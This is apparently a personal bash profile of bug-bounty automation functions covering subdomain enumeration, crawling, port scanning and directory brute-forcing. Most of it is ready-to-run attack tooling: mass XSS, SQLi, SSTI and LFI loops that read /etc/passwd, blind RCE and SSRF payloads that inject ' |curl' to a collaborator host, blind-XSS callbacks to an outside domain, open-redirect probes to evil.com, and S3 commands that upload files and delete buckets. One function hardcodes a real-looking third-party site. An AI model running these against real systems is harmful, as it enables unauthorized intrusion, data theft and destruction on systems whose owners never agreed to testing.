#go
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

#aquatone
export PATH=$PATH:/root/tools/aquatone

#findomain
export PATH=$PATH:/root/tools/findomain

#gf
source $GOPATH/pkg/mod/github.com/tomnomnom/gf@v0.0.0-20200618134122-dcd4c361f9f5/gf-completion.bash







#Asset Discovery[10] ------------------------------------------------------

asset-discovery-1(){


#Subdomain enumeration [6 tools]
#amass
amass enum --passive -d $1 > amass.txt

#findomain
findomain -t $1 -u findomain.txt

#crtsh
curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee -a ./crtsh.txt

#assetfinder
assetfinder --subs-only $1 > assetfinder.txt

#subfinder
subfinder -d $1 -o subfinder.txt

#sublist3r
python3 ~/tools/Sublist3r/sublist3r.py -d $1 -t 10 -v -o sublist3r.txt

#Sort subdomain
cat amass.txt findomain.txt crtsh.txt assetfinder.txt subfinder.txt sublist3r.txt | sort -u > subdomain.txt

#httprobe (Checking whether domain is alive or not)
cat subdomain.txt | httprobe > httprobe.txt

#httpx 
cat subdomain.txt | httpx > httpx.txt

#live domain
cat httprobe.txt httpx.txt | unfurl --unique domains > live-subdomain.txt

#Massdns (to get ip for all subdomains )
~/tools/massdns/./bin/massdns -r ~/tools/massdns/lists/resolvers.txt -t A -o S -w massdns.out subdomain.txt
#Output will look like  events.samjoy.in. A 201.10.208.14

#To get only IP
cat massdns.out | awk '{print $3}' | sort -u | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" > ips-online.txt

#To get not-cloudflare ips
python3 ~/tools/clean_ips.py ips-online.txt non-cloudflare-ips.txt

#lives-subdomain + ips for Nmap to scan for vulnerabilities
cat non-cloudflare-ips.txt live-subdomain.txt | tee non-cloudflare-ips_live-subdomain.txt

#Screenshots
python3 ~/tools/eyewitness/EyeWitness-20211018.1/Python/EyeWitness.py -f live-subdomain.txt --web
python3 ~/tools/eyewitness/EyeWitness-20211018.1/Python/EyeWitness.py -f ips-online.txt --web


#cat $1 | awk '{print $1}' | sed 's/.$//' | sort -u >final.txt
#Used awk to get the first part

#subdomain checker 
python3 ~/tools/subdomain_checker.py live-subdomain.txt |sort -u >subdomain_status-code.txt

#remove files
rm amass.txt findomain.txt crtsh.txt assetfinder.txt subfinder.txt sublist3r.txt httprobe.txt httpx.txt geckodriver.log

}

#Asset Discovery[10] --------------------------------------------------------









#Content Discovery[3] --------------------------------------------------------






content-discovery-1(){

echo -n "content-discovery-1 target.com https://target.com"

#--------------
#crawl links:

#1----------------
#gau (gau.txt) :
gau $1 | qsreplace -a | tee gau.txt

#2--------------------------------------
#Waybackurls (waybackurls.txt) :
echo $1 |waybackurls | qsreplace -a |tee waybackurls.txt

#3------------------------------
#GoSpider (gospider.txt) :
gospider -s "$2" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | tee gospider.txt

#$2 = URL(http://testphp.vulnweb.com)


#4-----------------------------
#Hakrawler (hakrawler.txt) :
cat $2 | hakrawler -d 3 | grep "=" | qsreplace -a | tee hakrawler.txt

#$2 = file contains URL's (http://testphp.vulnweb.com)




#--------------------
#find parameters:

#1-----------------------------------------------------
#paramspider (parameters_paramspider.txt) :
python3 ~/tools/ParamSpider/paramspider.py --d $1 -o ~/recon/$1/parameters_paramspider.txt





#-----------
#Filtering:

#1------------------
#URL's (urls.txt) :
cat gau.txt waybackurls.txt gospider.txt hakrawler.txt | qsreplace -a | tee urls.txt


#2------------------------------------
#Parameters (parameters.txt) :
#(Filter the parameters using grep "=" from GAU + WaybackURLs + Gospider + Hakrawler)

cat urls.txt | grep "=" | tee parameters.txt


#3-------------------
#Javascript-Files: 

#1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#Filter JS files from GAU+waybackurls -->remove duplicates --> then check 200 status code using anti-burl (JS_GAU+WaybackURLs.txt) :  

cat gau.txt |grep -iE '\.js'|grep -iEv '\.jsp|\.json' >> gauJS.txt
cat waybackurls.txt | grep -iE '\.js'|grep -iEv '\.jsp|\.json' >> waybJS.txt

cat gauJS.txt waybJS.txt | sort -u >> final_JS ; rm gauJS.txt waybJS.txt

cat final_JS | anti-burl |awk '{print $4}' | sort -u >> JS_GAU+WaybackURLs.txt ; rm final_JS




#---------------------------
#Vulnerability Filtering:

#--------------
#XSS Filter

#1------------------------------------------------------------
#Filter URL using GF Pattern and kxss (xss.txt) :

cat urls.txt | gf xss | tee gf_xss.txt 
cat urls.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | tee kxss.txt

cat gf_xss.txt kxss.txt | sort -u > xss.txt ; rm gf_xss.txt kxss.txt


#2-------------------------------------------------------------------------
#Find hidden GET parameters in javascript files (JS_xss.txt) :

#Crawl Link from GAU + Find Js files + in JS files find variables + append it to domain

#Single target

echo $1 | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars";done >JS_xss.txt 






#--------------
#SQLi Filter

#1----------------------------------------------
#Filter URL using GF Pattern (sql.txt) :

cat urls.txt | gf sqli | tee sql.txt





mkdir results

}








content-discovery-2(){
#find parameters
#paramspider
cat live-subdomain.txt | xargs -I % python3 ~/tools/ParamSpider/paramspider.py -l high -o %.txt -d % ;
cat *.txt > /output/paramspider.txt

#crawl links
#gau
cat live-subdomain.txt | gau | sort -u > gau.txt

#gau with filtering
cat gau.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" | tee gau-filter.txt

#Waybackurls
cat live-subdomain.txt |waybackurls | sort -u | tee waybackurls.txt

#Waybackurls with filtering
cat waybackurls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" | tee waybackurls-filter.txt

cat gau-filter.txt waybackurls-filter.txt | qsreplace -a |tee injection.txt

echo "creating directory /results"
mkdir results

#Filter JS files
#getjs
#cat $1 |getJS >javascriptfile.txt

}


#Content Discovery[3] --------------------------------------------------------










#port scanning[4]------------------------------------------------------------------------


port-scan-1(){	

echo	"1. Rutscan: non cloud-flare (Domain or IP)   2. naabu: cloud-flare protected domain (Domain)   3. Nmap default port-scan (Domain or IP)   4. Nmap all ports-scan (Domain or IP)"	
	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
		echo -n "Enter the Domain or IP(target.com) : "
		read domain
             	rustscan -a $domain -u 5000 -- -sV
		;;

	2)
		echo -n "Enter the domain(target.com) : "
		read domain
             	naabu -host $domain -top-ports 1000
		;;
          
	3)
		echo -n "Enter the Domain or IP (target.com) : "
		read domain
             	nmap -sV -T3 -Pn -p2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,7447,7080,8880,8983,5673,7443,19000,19080,744,4443 $domain
		;;
	
	4)
		echo -n "Enter the Domain or IP (target.com): "
		read domain
  	        nmap -T5 -Pn -sS -sV -p- $domain
		;;
                *)
                        echo "Please give valid choice!!!"
		;;

esac

}




port-scan-2(){	

echo	"1. rustscan (non-cloudflare-ips_live-subdomain.txt)   2.masscan (non-cloudflare-ips.tx)   3.Nmap vulnerable scan: All ports (non-cloudflare-ips_live-subdomain.txt)    4.Nmap default port scan (non-cloudflare-ips_live-subdomain.txt)"	
	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
		echo -n "Input: list of Domain + IP's (non-cloudflare-ips_live-subdomain.txt) : "
             	rustscan -a non-cloudflare-ips_live-subdomain.txt -u 5000 -- -A -sV | tee rustscan.txt
		;;

	2)
		echo -n "Input: list of IP's (non-cloudflare-ips.txt) :  "
             	masscan -iL non-cloudflare-ips.txt -p1-65535 --rate=10000 -oL masscan.txt
		;;
          
	3)
		echo -n "Input: List of Domain + IP's (non-cloudflare-ips_live-subdomain.txt) : "

             	nmap -sV -iL non-cloudflare-ips_live-subdomain.txt -oN Nmap_vuln_scan.txt --script=vuln
		;;

               4)
		echo -n "Input: List of Domain + IP's (non-cloudflare-ips_live-subdomain.txt) : "
		
             	nmap -sV -iL non-cloudflare-ips_live-subdomain.txt -T3 -Pn -p2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,443,7447,7080,8880,8983,5673,7443,19000,19080,744,4443 -oN Nmap_default_port-scan.txt 
		;;

    *)
                        echo "Please give valid choice!!!"
		;;

esac

}
	


#Port-scanning[4] ------------------------------------------------------------------------











#directory-bruteforce[5] ----------------------------------------------------------------


directory-bruteforce-1(){

echo    "1. Dirsearch: default-wordlist (domain)   2.ffuf: word-list (domain)"

echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
        1)
                echo -n "Enter the domain (https://target.com (or) https://192.168.1.2) : "
                read domain
                echo -n "extensions (all (or) php,html,json,aspx,sql,asp,js) : "
                read extensions
                echo -n "Path of recon folder (~/recon/#path/dirsearch.txt) : "
                read path
                python3 ~/tools/dirsearch/dirsearch.py -u $domain -e $extensions -t 50 -b -o ~/recon/$path/dirsearch.txt
                ;;

        2)
                echo -n "Enter the domain (https://domain.com) : "
                read domain
                echo -n "Enter the path of wordlist (~/wordlist/#path) : "
                read path
                ffuf -w ~/wordlist/$path -u $domain/FUZZ -mc 200,403
                ;;


      
    *)
                        echo "Please give valid choice!!!"
                ;;

esac

}


directory-bruteforce-2(){

echo    "1. Dirsearch: default-wordlist (directory-bruteforce.txt)   2.ffuf: word-list (directory-bruteforce.txt)"

echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
        1)
                echo -n "Input: List of Urls,ports (directory-bruteforce.txt) : "
                echo -n "Input the extensions (all (or) php,html,json,aspx,sql,asp,js) : "
                read extensions
                echo -n "Path of recon folder (~/recon/#path/dirsearch.txt) : "
                read path
                cat directory-bruteforce.txt | xargs -P4 -I{} -n1 python3 ~/tools/dirsearch/dirsearch.py -u {} -e $extensions -t 60 -b -o ~/recon/$path/dirsearch.txt
                ;;

        2)      
                echo -n "IMPORTANT: check wordlist's:  / and directory-bruteforce.txt: domain format"
                echo -n "Input: List of Urls,ports (directory-bruteforce.txt) : "

                echo -n "Enter the path of wordlist (~/wordlist/#path:FUZZ) : "
                read path
                ffuf -w ~/wordlist/$path:FUZZ -w directory-bruteforce.txt:URL -u URL/FUZZ -mc 200,403 -of csv -o ffuf-result.txt ; cat ffuf-result.txt | awk -F ',' '{print $3}' > ffuf-filtered_result.txt
                ;;


      
    *)
                        echo "Please give valid choice!!!"
                ;;

esac

}



#directory-bruteforce[5] ----------------------------------------------------------------










#aws-CLI[1]-----------------------------------------------------------------------------------------


s3bucket-misconfig(){
aws s3 ls s3://$1 --no-sign-request

aws s3 cp ~/s3sambucket.svg s3://$1/s3sambucket.svg --no-sign-request

aws s3 mv ~/s3sambucket.svg s3://$1/s3sambucket.svg --no-sign-request

aws s3 cp ~/s3sambucket.svg s3://$1 --acl public-read

aws s3 mv ~/s3sambucket.svg s3://$1 --acl public-read


aws s3 rb s3://$1

}


#aws-CLI-----------------------------------------------------------------------------------------










#xss-----------------------------------------------------------------------------------------




xss-1(){	

echo	"1. dalfox_gf+kxss (xss.txt)   2. dalfox_paramspider (parameters_paramspider.txt)   3. dalfox_Gospider_single (https://target.com)   4. dalfox_Hidden_GET_JSfiles (JS_xss.txt)"	

mkdir results/xss	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                #Exploit  
                                dalfox file xss.txt -b gabriel.xss.ht -o dalfox_gf+kxss_blind-xss.txt 
                                dalfox file xss.txt -o dalfox_gf+kxss_non-blind-xss.txt
 
                                #move file
                                mv dalfox_gf+kxss_blind-xss.txt dalfox_gf+kxss_non-blind-xss.txt results/xss

		;;

	2)
		#Exploit
		dalfox file parameters_paramspider.txt -b gabriel.xss.ht -o dalfox_parameters_paramspider_blind.txt 
                                 dalfox file parameters_paramspider.txt -o dalfox_parameters_paramspider_non-blind.txt
 
                                 #move file
                                  mv dalfox_parameters_paramspider_blind.txt dalfox_parameters_paramspider_non-blind.txt results/xss
		;;
          
	3)
		echo -n "Enter the Domain (https://target.com) : "
		read domain
             	gospider -s "$domain" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o dalfox_Gospider_xss.txt

                                #move file
                                mv dalfox_Gospider_xss.txt results/xss

		;;
	
	4)
		#Exploit  
                                dalfox file xss.txt -b gabriel.xss.ht -o dalfox_JS_blind-xss.txt 
                                dalfox file xss.txt -o dalfox_JS_non-blind-xss.txt
 
                                #move file
                                mv dalfox_JS_blind-xss.txt dalfox_JS_non-blind-xss.txt results/xss
               


		;;
                *)
                        echo "Please give valid choice!!!"
		;;

esac

}



xss-2(){	

echo	"1. qsreplace_reflected (*.txt)   2. Path_based_XSS (*.txt)   3. dalfox (*.txt)   4. dalfox_Gospider_multiple (urls.txt)"	
	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                echo -n "Enter the file name (*.txt) : "
		read file
                                #Exploit  
                                cat $file | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 
		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
		read file
		#Exploit
		cat $file | gf xss | while read url; do dir=$(curl -s -L "$url/xss\"><"|grep 'xss"');echo -e "Target:\e[1;33m $url/\"><\e[0m""\n" "\e[1;32m$dir\e[0m"; done
 
                                
		;;
          
	3)
		echo -n "Enter the file name (*.txt) : "
		read file
		#Exploit
                                dalfox file $file -b gabriel.xss.ht 
                                dalfox file $file 

		;;
	
	4)
                                echo -n "Enter the file name (*.txt) : "
		read file
		#Exploit
  	        gospider -S $file -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe
		;;
                *)
                        echo "Please give valid choice!!!"
		;;

esac

}






#xss-----------------------------------------------------------------------------------------






#sql-----------------------------------------------------------------------------------------



sql(){

mkdir results/sql

#Exploit
python3 ~/tools/sqlmap-dev/sqlmap.py -m sql.txt --batch | tee sql-result

#move
mv sql-result results/sql

}



#sql-----------------------------------------------------------------------------------------






#SSRF------------------------------------------------------------------------------------





ssrf-1(){	

echo	"1. qsreplace_blind-ssrf (urls.txt parameters_paramspider.txt)   2. qsreplace_blind-ssrf (.txt)  3. Check Blind ssrf in Header,Path,Host & check xss via web cache poisning () "	

mkdir results/ssrf	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
		read domain
                                #Exploit  
                                cat urls.txt parameters_paramspider.txt | sort -u | gf ssrf | httpx -silent | qsreplace http://$domain >> blind_ssrf.txt && ffuf -c -w blind_ssrf.txt -u FUZZ -t 200
 
                                #move file
                                mv blind_ssrf.txt results/ssrf

		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
		read file
                                echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
		read domain
		#Exploit
		cat $file | sort -u | gf ssrf | httpx -silent | qsreplace http://$domain >> blind_ssrf_random-file.txt && ffuf -c -w blind_ssrf_random-file.txt -u FUZZ -t 200
 
                                 #move file
                                  mv blind_ssrf_random-file.txt results/ssrf
		;;
          
	3)
		echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
		read domain
             	                cat urls.txt parameters_paramspider.txt | sort -u | gf ssrf | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: $domain' | grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: $domain' |grep xss) xss3=$(curl -s -L $url -H 'Host: $domain' | grep xss) xss4=$(curl -s -L $url --request-target http://$domain/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://$domain HTTP/1.1 ""\n";done

                                #move file
                                

		;;
	
	4)
		#Exploit  
                                dalfox file xss.txt -b gabriel.xss.ht -o dalfox_JS_blind-xss.txt 
                                dalfox file xss.txt -o dalfox_JS_non-blind-xss.txt
 
                                #move file
                                mv dalfox_JS_blind-xss.txt dalfox_JS_non-blind-xss.txt results/xss
               


		;;
                *)
                        echo "Please give valid choice!!!"
		;;

esac

}



#SSRF------------------------------------------------------------------------------------





#Open-redirect---------------------------------------------------------------------------





open-redirect(){

mkdir results/open-redirect

#Exploit
cat urls.txt parameters_paramspider.txt | sort -u | gf redirect | qsreplace "https://evil.com" | httpx -silent -status-code -location | tee open-redirect.txt

#move
mv open-redirect.txt open-redirect

}





#Open-redirect---------------------------------------------------------------------------






#SSTI-------------------------------------------------------------------------------------





ssti(){	

echo	"1. qsreplace_ssti (urls.txt parameters_paramspider.txt)   2. qsreplace_ssti (.txt)   "	

mkdir results/ssti	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                #Exploit  
                                cat urls.txt parameters_paramspider.txt | gf ssti | qsreplace "ssti{{7*7}}"  |  while read url; do cur=$(curl -s $url  | grep "ssti49"); echo -e "$url -> $cur";done | tee ssti.txt
 
                                #move file
                                mv ssti.txt results/ssti

		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
		read file
                                echo -n "Enter the payload (ssti{{7*7}}) : "
		read payload
           
		#Exploit
		cat $file | gf ssti | qsreplace "$payload"  |  while read url; do cur=$(curl -s $url  | grep "ssti49"); echo -e "$url -> $cur";done | tee ssti_random-file.txt
 
                                 #move file
                                  mv ssti_random-file.txt results/ssti
		;;
          
	
                *)
                        echo "Please give valid choice!!!"
		;;

esac

}





#SSTI-------------------------------------------------------------------------------------







#LFI-------------------------------------------------------------------------------------





lfi(){	

echo	"1. qsreplace_LFI (urls.txt parameters_paramspider.txt)   2. qsreplace_LFI (.txt)  3. wordlist_LFI () "	

mkdir results/lfi	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                echo -n "Enter the payload (../../etc/passwd) : "
	  			read payload
                                #Exploit  
                                cat urls.txt parameters_paramspider.txt | sort -u | gf lfi | qsreplace "$payload" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee lfi.txt
 
                                #move file
                                mv lfi.txt results/lfi

		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
				read file
                                echo -n "Enter the payload (../../etc/passwd) : "
				read payload
				#Exploit
				cat $file | sort -u | gf lfi | qsreplace "$payload" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee lfi_random-file.txt
 
                                #move file
                                mv lfi_random-file.txt results/ssrf
		;;
          
	3)
				echo -n "Enter the path of wordlist (~/wordlist/#path) : "
                                read path
        
				#Exploit
             	                cat urls.txt parameters_paramspider.txt | sort -u | gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/$path ; done | tee lfi_wordlist.txt

                                #move file
                                mv lfi_wordlist.txt results/ssrf
		;;
	
	
                *)
                        echo "Please give valid choice!!!"
		;;

esac

}






#LFI-------------------------------------------------------------------------------------







#RCE-------------------------------------------------------------------------------------





rce(){	

echo	"1. qsreplace_blind-rce (urls.txt parameters_paramspider.txt)   2. qsreplace_blind-rce (.txt)"  

mkdir results/rce	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
				read domain
                                #Exploit  
                                cat urls.txt parameters_paramspider.txt | sort -u | gf rce | grep '=' | qsreplace -a ' |curl http://$domain' | while read url; do rce=$(curl -s $url);echo -e "[RCE-test]$url";done | tee blind_rce.txt
 
                                #move file
                                mv blind_rce.txt results/rce

		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
				read file
                                echo -n "Enter the collaborator payload (payloads.burpcollaborator.net) : "
				read domain
				#Exploit
				cat $file | grep '=' | qsreplace -a ' | |curl http://$domain' | while read url; do rce=$(curl -s $url);echo -e "[RCE-test]$url";done | blind_rce_random-file.txt
 
                                 #move file
                                  mv blind_rce_random-file.txt results/rce
		;;
          
	
                *)
                        echo "Please give valid choice!!!"
		;;

esac

}






#RCE-------------------------------------------------------------------------------------






#testing remaining-----------------------------------------------------------------------

testing(){

ls
pwd
}


remain(){
gospider -s "https://www.eucerin.nl/" -c 10 -d 1 --other-source | tee rls.txt

cat rls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" | tee spider.txt

}

gospider-1(){
gospider -S $1 -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'|grep "=" | qsreplace -a | dalfox pipe -o result.txt
}

arjun-1(){
arjun -i $1 -oT arjun1.txt
}

arjun-2(){
arjun -u $1 -m GET -oT arjun-get.txt
arjun -u $1 -m POST -oT arjun-post.txt
arjun -u $1 -m JSON -oT arjun-json.txt
}


dalfox1(){
dalfox -b gabriel.xss.ht file $1

}

aqua() {
cat $1 | aquatone -out /root/recon/aquatone
}

#URL and parameter discovery

#URL Discovery
getallurl(){
cat $1 | gau -o gau.txt
}

wayback(){
cat $1 |waybackurls >waybackurls.txt
}

arjunfinder(){
arjun -i $1 -oT arjun.txt
}

getjs(){
cat $1 |getJS >javascriptfile.txt
}



#testing remaining-----------------------------------------------------------------------





